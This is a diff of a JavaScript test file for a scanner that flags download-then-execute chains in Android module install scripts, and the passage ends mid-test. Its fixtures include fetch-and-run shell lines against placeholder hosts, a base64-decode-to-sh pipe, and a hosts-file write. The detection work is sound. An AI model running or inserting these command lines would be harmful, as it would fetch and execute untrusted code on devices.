@@ -2571,6 +2571,10 @@ const ANCHOR_WITNESS = {
   DOWNLOAD_THEN_EXEC: {
     payload: 'curl https://abc.cc/x -o /data/local/tmp/u\nchmod 700 /data/local/tmp/u\n/data/local/tmp/u\n',
   },
+  // Task 3.1 §3：tree 那一格。跨行规则同上 —— witness 必须是一整篇文本，且**恰好**命中 1 条。
+  DOWNLOAD_TO_MODULE_EXEC: {
+    payload: 'wget -qO "$MODPATH/system/bin/bash" https://abc.cc/bash\nchmod 0755 "$MODPATH/system/bin/bash"\n',
+  },
   OBFUSCATED_DECODE_EXEC: { payload: 'echo $B64 | base64 -d | sh' },
   OBFUSCATED_DECODE_ONLY: { payload: 'echo $B64 | base64 -d > /data/local/tmp/out' },
   WRITE_SYSTEM_VENDOR: { payload: 'echo x >> /system/etc/hosts' },
@@ -3764,4 +3768,435 @@ test('T3 变异防线：链的证据必须同时含落地行与执行行（snipp
   assert.match(f.snippet, /chmod 700 \/data\/local\/tmp\/u/, 'chmod 作为同一条链的证据进 snippet');
   assert.match(f.snippet, /-> \/data\/local\/tmp\/u/, '执行行的证据要在');
   assert.equal(f.file, 'service.sh');
+});
+
+// ===========================================================================
+// Task 3.1 —— T3 第二版：写法面放宽（融合短选项簇 / 命令位末段是下载器）、
+//              case 标签不立 sink，外加新增的 tree 那一格 DOWNLOAD_TO_MODULE_EXEC。
+// ===========================================================================
+// 需求来源：工单 `briefs/task-3.1.md` §2/§3 + 计划 §0.18（13 个公开包实测：误伤 0 条，
+// 但一条逐字确认存在的真链 0 命中 —— 原因全在写法面）。
+//
+// 这一节的两条硬规矩（工单 §0/§5，写在这儿是为了让下一轮的人一眼看见）：
+//   ① **只动写法面**：路径精确相等、执行晚于落地、禁止模糊匹配这三条判据一个字没松 ——
+//      所以每一条「放宽」的夹具旁边都跟着一个「同写法但路径不相等 / 不在相干目录」的反面；
+//   ② **误伤 0 条是本轮唯一的资产**：任何一条新形状若在 13 个真包上多咬一口，本轮就是做坏了。
+//
+// 夹具里的 sink 行是**逐字真包原文**（包名 + 文件:行号写在注释里，`fp-t3/` 在盘上可复验）。
+// 只有两种改动是夹具自己的，每一处都在注释里点名改了哪半句：
+//   * 补一行「把链补齐」的执行形态 —— 因为 DOWNLOAD_THEN_EXEC 只在**成链**时才出发现，光有 sink 观察不到；
+//   * 把位置参数 `$2` 换成可钉住的路径 —— 为了把「命令位」这一半单独拎出来做活体检测。
+const T31_SHEBANG = '#!/system/bin/sh';
+const t31body = (...lines) => lines.join('\n') + '\n';
+/** 新规则的文本层命中（与 t3hits 同口径，只是换成另一条规则）。 */
+function t31mod(text, file = 'service.sh') {
+  return hits('DOWNLOAD_TO_MODULE_EXEC', text, file).map((f) => `${f.line}/${f.severity}`).sort();
+}
+/** 老规则的文本层命中。 */
+const t31dte = (text, file = 'service.sh') => hits('DOWNLOAD_THEN_EXEC', text, file)
+  .map((f) => `${f.line}/${f.severity}`).sort();
+
+// —— §2(a) 融合短选项簇 / 带值连写：立 sink ——
+
+test('T3.1-A1 正面（逐字 sensitive-props customize.sh:207/208 + 215）：-qO / -sLo 融在短选项簇里也要立 sink', () => {
+  // sensitive-props-main/customize.sh:207 '    if wget -qO "$MODPATH/resetprop-rs" "$RESETPROP_RS_URL/$RESETPROP_RS_ASSET" 2>/dev/null || \'
+  // sensitive-props-main/customize.sh:208 '       curl -sLo "$MODPATH/resetprop-rs" "$RESETPROP_RS_URL/$RESETPROP_RS_ASSET" 2>/dev/null; then'
+  // sensitive-props-main/customize.sh:215 '      chmod 755 "$MODPATH/resetprop-rs"'
+  // 第 5 行 = 真包 216 行**去掉行首那个 `if`** 的形状：`if` 前缀不在工单授权的三个写法面里
+  // （§2(b) 自己拍的硬边界把命令位是 `if` 的那一格挡在外面），这里摘掉它才能单独观察 (a) 这一面。
+  const t = t31body(T31_SHEBANG,
+    '    if wget -qO "$MODPATH/resetprop-rs" "$RESETPROP_RS_URL/$RESETPROP_RS_ASSET" 2>/dev/null || \\',
+    '       curl -sLo "$MODPATH/resetprop-rs" "$RESETPROP_RS_URL/$RESETPROP_RS_ASSET" 2>/dev/null; then',
+    '      chmod 755 "$MODPATH/resetprop-rs"',
+    '      "$MODPATH/resetprop-rs" -h');
+  assert.deepEqual(t31dte(t), ['5/high'],
+    '-sLo 认下来之后：sink=208 那一行、执行=第 5 行 ⇒ 一条链（摘掉簇支持时这里必须是 0 —— 变异 (1) 红在这儿）');
+  const [f] = hits('DOWNLOAD_THEN_EXEC', t);
+  assert.match(f.snippet, /curl -sLo "\$MODPATH\/resetprop-rs"/, 'snippet 必须带 208 那半句逐字原文');
+  assert.match(f.snippet, /chmod 755 "\$MODPATH\/resetprop-rs"/, '215 的 chmod 作为同一条链的证据');
+});
+
+test('T3.1-A2 正面（逐字 magisk-tailscaled customize.sh:29）：-qO 带值 + 变量拼出的落地路径照样成链', () => {
+  // magisk-tailscaled/customize.sh:29 '\twget --no-check-certificate --timeout=100 -qO "$TMPDIR/$FILENAME" "$DOWNLOAD_URL" || {'
+  // 执行行是夹具补的（真包把下载的东西 tar -xzf 解开、没有执行那一行 ⇒ 真包本身 0 条，见误伤表）。
+  const t = t31body(T31_SHEBANG,
+    'wget --no-check-certificate --timeout=100 -qO "$TMPDIR/$FILENAME" "$DOWNLOAD_URL" || {',
+    'sh "$TMPDIR/$FILENAME"');
+  assert.deepEqual(t31dte(t), ['3/high'], '两侧都写成 $TMPDIR/$FILENAME：精确相等才成链');
+  // 同一写法但执行路径只差一个尾段 ⇒ 不许按 basename 或前缀配对（§5 禁止的那三种宽松）
+  assert.deepEqual(t31dte(t31body(T31_SHEBANG,
+    'wget --no-check-certificate --timeout=100 -qO "$TMPDIR/$FILENAME" "$DOWNLOAD_URL" || {',
+    'sh "$TMPDIR/$FILENAME.x"')), [], '路径差一个尾巴就不是同一条链：模糊匹配仍然禁止');
+});
+
+test('T3.1-A3 写法面：簇与连写的收口逐字钉死 —— -qO/-sLo/-O<path> 连写收，-sLoo/-qO-/-o/dev/stdout 不收', () => {
+  const exec = 'sh /data/local/tmp/u';
+  // 收：末位（也是唯一那位）是 o/O 的短选项簇，值在下一个词
+  for (const dl of [
+    'wget -qO /data/local/tmp/u https://x.dev/u', // sensitive-props:207 / tailscaled:29 / tree:38 / beszel:58
+    'curl -sLo /data/local/tmp/u https://x.dev/u', // sensitive-props:208 / beszel:56
+    'curl -sL -o /data/local/tmp/u https://x.dev/u', // 既有形状不许回退
+    'wget -O /data/local/tmp/u https://x.dev/u',
+    'curl -o /data/local/tmp/u https://x.dev/u',
+    'curl -s -O=/data/local/tmp/u https://x.dev/u', // 既有 -O= 形状（eq 分支）不许回退
+  ]) {
+    assert.deepEqual(t31dte(t31body(T31_SHEBANG, dl, exec)), ['3/high'], `簇应当立 sink：${dl}`);
+  }
+  // 收：值直接粘在选项后面（-o<path> / -O<path>），以及 --output=<path>（既有，别回退）
+  for (const dl of [
+    'wget -O/data/local/tmp/u https://x.dev/u',
+    'curl -o/data/local/tmp/u https://x.dev/u',
+    'wget -qO/data/local/tmp/u https://x.dev/u',
+    'curl -sLo/data/local/tmp/u https://x.dev/u',
+    'curl -s --output=/data/local/tmp/u https://x.dev/u',
+  ]) {
+    assert.deepEqual(t31dte(t31body(T31_SHEBANG, dl, exec)), ['3/high'], `带值连写应当立 sink：${dl}`);
+  }
+  // 不收：标准输出形态（真包活样本 Yuri:46 / tailscaled:17 + T3.11 那一族）
+  for (const dl of [
+    'busybox wget -T 10 --no-check-certificate -qO- "$1"', // 逐字 Yuri customize.sh:46（命令位是 busybox，双重不收）
+    'wget --no-check-certificate --timeout=10 -qO- "https://api.github.com/repos/x/y" |', // 逐字 tailscaled:17
+    'wget -qO- /data/local/tmp/u https://x.dev/u', // 活体检测：-qO- 之后的路径也不许被当成落盘目标
+    'curl -sLo- /data/local/tmp/u https://x.dev/u',
+    'curl -o/dev/stdout https://x.dev/u',
+    'wget -qO/dev/stdout https://x.dev/u',
+    'curl -o- https://x.dev/u',
+    'curl -s -o - https://x.dev/u',
+    'curl -s --output - https://x.dev/u',
+    'wget -q -O - https://x.dev/u',
+    'wget -q -O- https://x.dev/u',
+    'curl -s https://x.dev/u 2>/data/local/tmp/u',
+  ]) {
+    assert.deepEqual(t31dte(t31body(T31_SHEBANG, dl, exec)), [], `标准输出不是落盘：${dl}`);
+  }
+  // 不收：末位不是「唯一那位 o/O」的簇（`-sLoo` 按短选项簇语义，第一个 o 就吃掉余下的一切，见工单 §2(a)）
+  for (const dl of [
+    'curl -fsSL --connect-timeout 15 https://x.dev/u', // 逐字 AlwaysStrong:84 的选项段
+    'wget -q -T 20 https://x.dev/u',
+    'curl -sLoo /data/local/tmp/u https://x.dev/u',
+  ]) {
+    assert.deepEqual(t31dte(t31body(T31_SHEBANG, dl, exec)), [], `不是落盘选项的簇不许被收：${dl}`);
+  }
+  // 不收：相对路径落地（写法面放宽 ≠ 路径判据放宽 —— 逐字 beszel action.sh:56）
+  assert.deepEqual(t31dte(t31body(T31_SHEBANG,
+    '        curl -sLo beszel-agent-update.tar.gz "$url" 2>/dev/null',
+    'sh beszel-agent-update.tar.gz')), [], '钉不住的相对路径不立 sink：既有口径一字未动');
+});
+
+test('T3.1-A4 上限与去重：簇形态的链与既有 -o 形态同表同上限，且一条链只报一次', () => {
+  const t = t31body(T31_SHEBANG,
+    'wget -qO /data/local/tmp/w https://x.dev/w',
+    'curl -sLo /data/local/tmp/w https://x.dev/w',
+    'chmod 700 /data/local/tmp/w',
+    '/data/local/tmp/w');
+  assert.deepEqual(t31dte(t), ['5/high'], '同一个落地路径的两种写法是同一条链：取最早执行行，只出 1 条');
+  const lines = [T31_SHEBANG];
+  for (let i = 1; i <= 25; i++) {
+    lines.push(`wget -qO /data/local/tmp/g${i} https://x.dev/g${i}`);
+    lines.push(`/data/local/tmp/g${i}`);
+  }
+  assert.equal(hits('DOWNLOAD_THEN_EXEC', lines.join('\n') + '\n').length, 20,
+    'maxPerFile 的基数还是链、还是 20：写法面放宽不许把上限放大');
+});
+
+test('T3.1-A5 记录（交回主控裁定）：逐字 sensitive-props 207/208/215/216 整段仍然 0 命中 —— 挡住的是 216 行行首那个 `if`', () => {
+  // 工单 §4.1 给的期望值是「改后必须 1 命中，落点在 216（执行行）」。跑成的事实是：
+  // §2(a)(b)(c) 三面做完之后 sink 这一半已经看得见（A1 就是它），**执行那一半仍然看不见**，
+  // 原因不在 sink 的写法上，而在执行行的命令位是控制词 `if` ——
+  // 而 §2(b) 自己拍的硬边界（「命令位那个词…末段字面量等于 curl 或 wget 才算」）把 `if` 挡在外面，
+  // 穿透控制词既不在本轮授权的三个写法面里，也撞上代码里那句「本规则不扩这张表；要扩得另开一轮并补夹具」。
+  // 所以这里按真包原样把 0 命中钉成夹具（与上一轮 T3.9「已知限度，不许写成已覆盖」同一做法），
+  // 并留一条**只删三个字符**的对照：谁哪天把控制词穿透了，这两条断言会一起告诉他落点是 216。
+  const real = [
+    T31_SHEBANG,
+    '    if wget -qO "$MODPATH/resetprop-rs" "$RESETPROP_RS_URL/$RESETPROP_RS_ASSET" 2>/dev/null || \\',
+    '       curl -sLo "$MODPATH/resetprop-rs" "$RESETPROP_RS_URL/$RESETPROP_RS_ASSET" 2>/dev/null; then',
+    '      chmod 755 "$MODPATH/resetprop-rs"',
+    '      if "$MODPATH/resetprop-rs" -h >/dev/null 2>&1; then'];
+  assert.deepEqual(t31dte(t31body(...real)), [],
+    '整段逐字（真包 sensitive-props customize.sh 的原样）：DOWNLOAD_THEN_EXEC 今天仍然 0 命中');
+  assert.deepEqual(t31mod(t31body(...real)), [], '同理 DOWNLOAD_TO_MODULE_EXEC 也不报：路径 resetprop-rs 不在模块 system/ 下');
+  // 对照：只把 216 行行首的 `if ` 摘掉（其余一字不动）⇒ 同一条链立刻说话，落点正是工单要的那一行
+  const withoutIf = real.map((l, i) => (i === 4 ? l.replace(/^(\s*)if /, '$1') : l));
+  assert.notEqual(withoutIf[4], real[4], '对照必须真的只改了那一个 `if `');
+  assert.deepEqual(t31dte(t31body(...withoutIf)), ['5/high'],
+    '唯一挡住这条链的就是行首那个 `if` —— 不是 sink 的写法，也不是路径判据');
+});
+
+// —— §2(b) 命令位末段是 curl/wget：只多收这一格 ——
+
+test('T3.1-B1 正面（逐字 microG customize.sh:17/27）：$curl 解析后末段是 curl ⇒ 下载段成立', () => {
+  // microG-GApps-master/customize.sh:17 '    curl=$MODPATH/tools/curl/arm64eabi-v7a/curl'
+  // microG-GApps-master/customize.sh:27 '$curl -o "$MODPATH/system/priv-app/microGServicesCore/base.apk" -k "https://microg.org/fdroid/repo/com.google.android.gms-231657056.apk"'
+  // 执行行是夹具补的：真包 microG 不执行 base.apk —— 工单 §2(b) 早写明这一格「不产生新链」。
+  const t = t31body(T31_SHEBANG,
+    '    curl=$MODPATH/tools/curl/arm64eabi-v7a/curl',
+    '$curl -o "$MODPATH/system/priv-app/microGServicesCore/base.apk" -k "https://microg.org/fdroid/repo/com.google.android.gms-231657056.apk"',
+    'sh "$MODPATH/system/priv-app/microGServicesCore/base.apk"');
+  assert.deepEqual(t31dte(t), ['4/high'], '$curl 解析成 …/curl ⇒ 末段是 curl ⇒ 下载段；两侧路径精确相等 ⇒ 一条链');
+  assert.deepEqual(t31mod(t), [], 'apk 没有被 chmod 加执行位 ⇒ §3 那一格不报（两个条件缺一个都不报）');
+});
+
+test('T3.1-B2 正面（逐字 Pixelify module/customize.sh:686 的命令位与 URL）：自带二进制 $MODPATH/addon/curl', () => {
+  // Pixelify-master/module/customize.sh:686
+  //  '                        $MODPATH/addon/curl https://gitlab.com/Kingsman-z/pixelify-files/-/raw/master/asi-new-31.tar.xz -o dp-$API.tar.xz &>/proc/self/fd/$OUTFD'
+  // 真包那一条的落盘目标是 `dp-$API.tar.xz`（相对路径，钉不住 ⇒ 不立 sink），所以分两步：
+  //   ① 逐字原样 ⇒ 必须 0（这一格的真包现实）；
+  //   ② 只把落盘目标换成可钉住的绝对路径 ⇒ 必须 1（否则变异 (2) 无从变红）。
+  assert.deepEqual(t31dte(t31body(T31_SHEBANG,
+    '                        $MODPATH/addon/curl https://gitlab.com/Kingsman-z/pixelify-files/-/raw/master/asi-new-31.tar.xz -o dp-$API.tar.xz &>/proc/self/fd/$OUTFD',
+    'sh dp-$API.tar.xz')), [], '逐字原样：落盘目标是相对路径 ⇒ 两侧都钉不住 ⇒ 0');
+  assert.deepEqual(t31dte(t31body(T31_SHEBANG,
+    '                        $MODPATH/addon/curl https://gitlab.com/Kingsman-z/pixelify-files/-/raw/master/asi-new-31.tar.xz -o /data/local/tmp/dp.tar.xz &>/proc/self/fd/$OUTFD',
+    'sh /data/local/tmp/dp.tar.xz')), ['3/high'],
+    '命令位末段是 curl（自带二进制）⇒ 下载段成立（摘掉这一格时这里必须是 0 —— 变异 (2) 红在这儿）');
+});
+
+test('T3.1-B3 反向（逐字 Integrity-Box common_func.sh:69 + webroot/UpdateTranslation.sh:56）：$DOWNLOADER 不认 —— 命令替换钉不住是故意的', () => {
+  // Integrity-Box/common_func.sh:69               '    DOWNLOADER=$(command -v curl); DL_MODE="curl"; return'
+  // Integrity-Box/webroot/UpdateTranslation.sh:56 '            "$DOWNLOADER" -L --fail --connect-timeout 15 --max-time 180 -o "$ZIP_PATH.tmp" "$URL" 2>/dev/null'
+  // 另加 13/14/15/16 那四条赋值，让 `$ZIP_PATH.tmp` 是**可钉住**的（钉不住的话这条反向夹具就是空转）；
+  // 执行行是夹具补的。工单 §2(b)：这一格明确不修、进已知限度，并且必须配反向夹具。
+  const t = t31body(T31_SHEBANG,
+    'URL="https://github.com/x/y/releases/download/archive/Canary.zip"',
+    'OUT_DIR="/storage/emulated/0/Download/IntegrityModules"',
+    'ZIP_NAME="Canary.zip"',
+    'ZIP_PATH="$OUT_DIR/$ZIP_NAME"',
+    '    DOWNLOADER=$(command -v curl); DL_MODE="curl"; return',
+    '            "$DOWNLOADER" -L --fail --connect-timeout 15 --max-time 180 -o "$ZIP_PATH.tmp" "$URL" 2>/dev/null',
+    'sh "$ZIP_PATH.tmp"');
+  assert.deepEqual(t31dte(t), [],
+    '$DOWNLOADER 的末段是 DOWNLOADER 而不是 curl ⇒ 不是下载段；放宽它就是把「谁都能伪装成 wget」写进判据（§0.18 明令禁止）');
+});
+
+test('T3.1-B4 反向（逐字 AlwaysStrong keybox_fetch.sh:83）：bounded 90 "$BB" wget 不认 —— 命令位是 bounded', () => {
+  // AlwaysStrong/keybox_fetch.sh:83 '        bb)      [ -n "$BB" ] && bounded 90 "$BB" wget -q -T 20 -O "$2" "$3" 2>/dev/null ;;'
+  // 这一行上叠着两个理由：命令位是 `bounded`（不是 curl/wget 字面量、末段也不是），以及 sink 是位置参数 `$2`。
+  // 工单 §0.18 ① 写的就是「位置参数当 sink：钉不住就不许模糊匹配」。
+  const t = t31body(T31_SHEBANG,
+    '        bb)      [ -n "$BB" ] && bounded 90 "$BB" wget -q -T 20 -O "$2" "$3" 2>/dev/null ;;',
+    'sh /data/local/tmp/kb.bin');
+  assert.deepEqual(t31dte(t), [], '命令位是 bounded ⇒ 整段的词全是参数；`$BB` 指向什么是运行期探测出来的，不认');
+  // 活体检测：把位置参数换成可钉住的路径（其余一字不动）⇒ 仍然必须 0，红的只能是「命令位」那一半
+  assert.deepEqual(t31dte(t31body(T31_SHEBANG,
+    '        bb)      [ -n "$BB" ] && bounded 90 "$BB" wget -q -T 20 -O /data/local/tmp/kb.bin "$3" 2>/dev/null ;;',
+    'sh /data/local/tmp/kb.bin')), [], '把 $2 换成可钉路径后依旧 0 ⇒ 沉默的原因是命令位，不是位置参数');
+});
+
+// —— §2(c) case 标签与命令探测位里的 curl/wget ——
+
+test('T3.1-C1 反向（逐字 AlwaysStrong keybox_fetch.sh:79-88）：curl) / wget) 标签行与 command -v curl 都不立 sink', () => {
+  // AlwaysStrong/keybox_fetch.sh:79-88 整段 run_engine（逐字），里面同时有
+  //   84 '        curl)    command -v curl >/dev/null 2>&1 && bounded 90 curl -fsSL … -o "$2" "$3" 2>/dev/null ;;'
+  //   85 '        wget)    command -v wget >/dev/null 2>&1 && bounded 90 wget -q -T 20 -O "$2" "$3" 2>/dev/null ;;'
+  // 实验结论（工单 §2(c) 要的那句话）：**标签行本身不产生 sink** —— `curl)` 在词法层被 `)` 切成
+  // 独立的段 [curl]，段里没有落盘选项，所以既不立 sink 也不立执行形态。
+  const block = t31body(T31_SHEBANG,
+    'run_engine() {',
+    '    rm -f "$2"',
+    '    case "$1" in',
+    '        asfetch) [ -n "$ABI" ] && [ -f "$ASFETCH" ] && { [ -x "$ASFETCH" ] || chmod 0755 "$ASFETCH" 2>/dev/null; } && bounded 90 "$ASFETCH" -T 15 -o "$2" "$3" 2>/dev/null ;;',
+    '        bb)      [ -n "$BB" ] && bounded 90 "$BB" wget -q -T 20 -O "$2" "$3" 2>/dev/null ;;',
+    '        curl)    command -v curl >/dev/null 2>&1 && bounded 90 curl -fsSL --connect-timeout 15 --speed-limit 1 --speed-time 20 --max-time 85 -o "$2" "$3" 2>/dev/null ;;',
+    '        wget)    command -v wget >/dev/null 2>&1 && bounded 90 wget -q -T 20 -O "$2" "$3" 2>/dev/null ;;',
+    '    esac',
+    '    [ -s "$2" ]',
+    '}');
+  assert.deepEqual(t31dte(block), [], '整段逐字喂进去：0 条链');
+  assert.deepEqual(t31mod(block), [], '整段逐字喂进去：0 条 DOWNLOAD_TO_MODULE_EXEC');
+  // 活体检测（工单 §2(c)「自己做实验确认」那一步）：把 84 行的落盘目标换成可钉住的路径，
+  // 标签 `curl)` 与 `command -v curl` 两处**仍然不许**被当成下载段。
+  assert.deepEqual(t31dte(t31body(T31_SHEBANG,
+    '        curl)    command -v curl >/dev/null 2>&1 && bounded 90 curl -fsSL --connect-timeout 15 -o /data/local/tmp/kb.bin "$3" 2>/dev/null ;;',
+    'sh /data/local/tmp/kb.bin')), [],
+    '把 sink 换成可钉路径后仍是 0 ⇒ 立不住的原因在命令位，标签与探测位没被当成下载段');
+  // 反面对照：同一形状但下载器**站在**命令位上 —— 证明上面那个 0 是判据在筛，不是规则没看见
+  assert.deepEqual(t31dte(t31body(T31_SHEBANG,
+    '        curl)    curl -fsSL -o /data/local/tmp/kb.bin "$3" 2>/dev/null ;;',
+    'sh /data/local/tmp/kb.bin')), ['3/high'], '标签后面紧跟真下载段时这条规则是看得见的');
+});
+
+test('T3.1-C2 反向（逐字 Integrity-Box webroot/UpdateTranslation.sh:54-58）：case 标签 curl) 与下载行分处两个逻辑行时不叠加', () => {
+  // Integrity-Box/webroot/UpdateTranslation.sh:54-58（逐字：55 行是标签，56 行的命令位是 "$DOWNLOADER"）
+  const t = t31body(T31_SHEBANG,
+    '    case "$DL_MODE" in',
+    '        curl)',
+    '            "$DOWNLOADER" -L --fail --connect-timeout 15 --max-time 180 -o "$ZIP_PATH.tmp" "$URL" 2>/dev/null',
+    '            rc=$?',
+    '            ;;',
+    'sh "/storage/emulated/0/Download/IntegrityModules/Canary.zip.tmp"');
+  assert.deepEqual(t31dte(t), [], '标签行不立 sink，下载行的命令位是 $DOWNLOADER ⇒ 两处都不认（工单 §2(b)/(c)）');
+});
+
+// —— §3 新增第二格 DOWNLOAD_TO_MODULE_EXEC ——
+
+test('T3.1-D1 正面（逐字 tree customize.sh:37/38/41/43）：远程内容落进模块 system/ 并被加执行位', async () => {
+  // Magisk-Modules-Alt-Repo/tree customize.sh:37 '    url="https://raw.githubusercontent.com/Magisk-Modules-Alt-Repo/mkshrc/master/common/bash/$bash_binary"'
+  // 同文件:38 '    wget -qO "$MODPATH/system/bin/bash" "$url"'
+  // 同文件:41 '    if [ $? -eq 0 ] && [ -f "$MODPATH/system/bin/bash" ]; then'
+  // 同文件:43 '        chmod 0755 "$MODPATH/system/bin/bash"'
+  const r = await t3scan('eval.t31d', t3body(T3_SHEBANG,
+    '    url="https://raw.githubusercontent.com/Magisk-Modules-Alt-Repo/mkshrc/master/common/bash/$bash_binary"',
+    '    wget -qO "$MODPATH/system/bin/bash" "$url"',
+    '    if [ $? -eq 0 ] && [ -f "$MODPATH/system/bin/bash" ]; then',
+    '        ui_print " => Download successful."',
+    '        chmod 0755 "$MODPATH/system/bin/bash"'));
+  assert.deepEqual(t3spots(r, 'DOWNLOAD_TO_MODULE_EXEC'), ['service.sh:6/high'], '报在加执行位那一行');
+  assert.equal(r.riskLevel, 'high');
+  assert.equal(r.decision.action, 'block', 'tree 今天就是 low/auto-approve —— 这一格闭的就是它');
+  const [f] = r.findings.filter((x) => x.ruleId === 'DOWNLOAD_TO_MODULE_EXEC');
+  assert.match(f.snippet, /wget -qO "\$MODPATH\/system\/bin\/bash"/, '落地行的证据要在');
+  assert.match(f.snippet, /chmod 0755 "\$MODPATH\/system\/bin\/bash"/, '加执行位那一行的证据也要在');
+  assert.equal(f.message, RULES_BY_ID.DOWNLOAD_TO_MODULE_EXEC.title, 'message 取自己的 title');
+  assert.notEqual(f.message, RULES_BY_ID.DOWNLOAD_THEN_EXEC.title,
+    '「远程内容被拿去执行」与「写进系统分区位置并加成可执行」是两个不同的主张（§2.7 文案纪律）');
+});
+
+test('T3.1-D2 反向：tree 若只下载不 chmod ⇒ 两个条件缺一个 ⇒ 不报', () => {
+  const t = t31body(T31_SHEBANG,
+    '    url="https://raw.githubusercontent.com/Magisk-Modules-Alt-Repo/mkshrc/master/common/bash/$bash_binary"',
+    '    wget -qO "$MODPATH/system/bin/bash" "$url"',
+    '    if [ $? -eq 0 ] && [ -f "$MODPATH/system/bin/bash" ]; then',
+    '        ui_print " => Download successful."');
+  assert.deepEqual(t31mod(t), [], '缺 chmod 那一半：不报（工单 §3 反向夹具第 1 条）');
+  assert.deepEqual(t31dte(t), [], '也没有执行形态：DOWNLOAD_THEN_EXEC 同样不报');
+});
+
+test('T3.1-D3 反向：/data/local/tmp + chmod 700 不报（T3.9 那一格的方向不许变，它不在模块 system/ 下）', () => {
+  const t = t31body(T31_SHEBANG,
+    'curl -s https://x.dev/u -o /data/local/tmp/u',
+    'chmod 700 /data/local/tmp/u');
+  assert.deepEqual(t31mod(t), [], '工单 §3 反向夹具第 2 条 = 上一轮 T3.9：落地位置不在模块里 ⇒ 不报');
+  assert.deepEqual(t31dte(t), [], '只有 chmod 没有执行：老口径一字未动');
+});
+
+test('T3.1-D4 反向：$MODPATH/data.json + chmod 644（没有执行位）与 curl -sLo 相对路径都不报', () => {
+  assert.deepEqual(t31mod(t31body(T31_SHEBANG,
+    'curl -s https://x.dev/cfg.json -o "$MODPATH/data.json"',
+    'chmod 644 "$MODPATH/data.json"')), [], '工单 §3 反向夹具第 3 条：没有执行位 + 不在 system/ 下，两半都不满足');
+  assert.deepEqual(t31mod(t31body(T31_SHEBANG,
+    '        curl -sLo beszel-agent-update.tar.gz "$url" 2>/dev/null',
+    'chmod 0755 beszel-agent-update.tar.gz')), [], '工单 §3 反向夹具第 4 条：相对路径不在模块 system/ 下 ⇒ 不报');
+  // 这条是 §3「执行位」那一半的活体检测：工单列的四条反向夹具每条都**同时**缺两个条件，
+  // 摘掉「执行位」那一半时它们不会变红（见报告 §7 的变异记录），所以补这一条 ——
+  // 路径在模块 system/ 下、chmod 却不带执行位。
+  assert.deepEqual(t31mod(t31body(T31_SHEBANG,
+    '    wget -qO "$MODPATH/system/etc/rsconf.conf" "$url"',
+    '    chmod 644 "$MODPATH/system/etc/rsconf.conf"')), [], '644 这一族没有执行位 ⇒ 不报（变异 (3) 红在这儿）');
+});
+
+test('T3.1-D5 写法面：执行位那一半只认加 x 的写法；落地位置那一半只认模块安装可见位置', () => {
+  const modPath = '"$MODPATH/system/bin/tool"';
+  // 加执行位的写法（工单 §3 点名的这一族）⇒ 报
+  for (const mode of ['+x', 'u+x', 'a+x', '0755', '755', '0700', '700', '750']) {
+    assert.deepEqual(t31mod(t31body(T31_SHEBANG,
+      `    wget -qO ${modPath} "$url"`,
+      `    chmod ${mode} ${modPath}`)), ['3/high'], `加执行位应当说话：chmod ${mode}`);
+  }
+  // 不加执行位的写法 ⇒ 不报
+  for (const mode of ['644', '0644', '600', '440', 'a-w', 'u-wx', '-x', 'go-w']) {
+    assert.deepEqual(t31mod(t31body(T31_SHEBANG,
+      `    wget -qO ${modPath} "$url"`,
+      `    chmod ${mode} ${modPath}`)), [], `没有执行位不该说话：chmod ${mode}`);
+  }
+  // 落地位置的模块写法都折算到同一个模块相对路径 ⇒ 都报
+  for (const p of ['"$MODPATH/system/bin/tool"', '"$MODDIR/system/bin/tool"',
+    '"${MODPATH}/system/bin/tool"', '"${MODDIR}/system/bin/tool"',
+    '"/data/adb/modules/some.id/system/bin/tool"']) {
+    assert.deepEqual(t31mod(t31body(T31_SHEBANG,
+      `    wget -qO ${p} "$url"`,
+      `    chmod 0755 ${p}`)), ['3/high'], `模块安装可见位置：${p}`);
+  }
+  // 不在安装可见位置 ⇒ 不报（模块根本身、模块里的普通目录、模块外的 service.d、临时目录）
+  for (const p of ['"$MODPATH/tool"', '"$MODPATH/update-binary"', '"$MODPATH/system.prop"',
+    '"$MODPATH/data/tool"', '"$MODPATH/service"', '"/data/adb/service.d/tool.sh"',
+    '"/data/adb/su/tool"', '"/dev/null"']) {
+    assert.deepEqual(t31mod(t31body(T31_SHEBANG,
+      `    wget -qO ${p} "$url"`,
+      `    chmod 0755 ${p}`)), [], `不在 system/ 也不是 $MODPATH/service.d/ 之下：${p}`);
+  }
+  // service.d/ 只认模块目录直接拼出的那一种（工单 §3 的原话），三种写法都要认
+  for (const p of ['"$MODPATH/service.d/boot.sh"', '"$MODDIR/service.d/boot.sh"',
+    '"${MODPATH}/service.d/boot.sh"']) {
+    assert.deepEqual(t31mod(t31body(T31_SHEBANG,
+      `    wget -qO ${p} "$url"`,
+      `    chmod 0755 ${p}`)), ['3/high'], `$MODPATH 直接拼出的 service.d/：${p}`);
+  }
+  // chmod 的 mode 与路径之间夹 `--` 分隔符时也要认出路径
+  assert.deepEqual(t31mod(t31body(T31_SHEBANG,
+    '    wget -qO "$MODPATH/system/bin/tool" "$url"',
+    '    chmod 0755 -- "$MODPATH/system/bin/tool"')), ['3/high'], '带 -- 分隔符的 chmod 也要说话');
+});
+
+test('T3.1-D6 反向：加执行位早于落地 ⇒ 不报（顺序判据与老规则同向）', () => {
+  const t = t31body(T31_SHEBANG,
+    '    chmod 0755 "$MODPATH/system/bin/bash"',
+    '    wget -qO "$MODPATH/system/bin/bash" "$url"');
+  assert.deepEqual(t31mod(t), [], '「先落地、后加执行位」才是这条规则说的话');
+});
+
+test('T3.1-D7 共存与上限：与 DOWNLOAD_THEN_EXEC 各说一件事，同一 sink 只报一次，每文件 ≤20', () => {
+  const both = t31body(T31_SHEBANG,
+    '    wget -qO "$MODPATH/system/bin/bash" "$url"',
+    '    chmod 0755 "$MODPATH/system/bin/bash"',
+    '    sh "$MODPATH/system/bin/bash" -c true');
+  assert.deepEqual(t31mod(both), ['3/high'], '新规则报在加执行位那一行');
+  assert.deepEqual(t31dte(both), ['4/high'], '老规则报在执行那一行：两条都在，不许互相吞');
+  const many = [T31_SHEBANG];
+  for (let i = 1; i <= 25; i++) {
+    many.push(`    wget -qO "$MODPATH/system/bin/b${i}" "$url"`);
+    many.push(`    chmod 0755 "$MODPATH/system/bin/b${i}"`);
+  }
+  assert.equal(hits('DOWNLOAD_TO_MODULE_EXEC', many.join('\n') + '\n').length, 20,
+    '每文件每规则的上限与工厂同值（20），基数是链不是行数');
+});
+
+test('T3.1-D8 规则自身形状：新 id 进表、category/severity/pattern/anchor 与同族一致，文案不合并', () => {
+  const rule = RULES_BY_ID.DOWNLOAD_TO_MODULE_EXEC;
